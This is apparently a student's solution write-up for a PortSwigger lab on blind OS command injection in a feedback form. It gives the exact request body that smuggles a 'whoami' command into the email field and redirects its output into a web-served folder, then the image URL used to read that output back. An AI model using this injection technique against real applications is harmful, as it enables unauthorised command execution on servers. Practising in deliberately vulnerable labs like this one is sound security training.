# Blind OS command injection with output redirection

## This lab contains a blind [OS command injection](https://portswigger.net/web-security/os-command-injection) vulnerability in the feedback function.

## The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:

## `/var/www/images/`

The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then _use the image loading URL to retrieve the contents of the file_.

To solve the lab, execute the `whoami` command and retrieve the output.

---

### step 1

whoami > /var/www/images/output.txt

csrf=J60D36lA81EHJ9W3GtrkPVGywDrTS2Se&name=mantoo&email=jemof16874%40jobsfeel.com||whoami>/var/www/images/output.txt||
&subject=how+to&message=hi+i+am+new+in+this

### step2

_use the image loading URL to retrieve the contents of the file_.
open images and intercept
GET /image?filename=22.jpg HTTP/1.1
and change the image name
GET /image?filename=output.txt HTTP/1.1
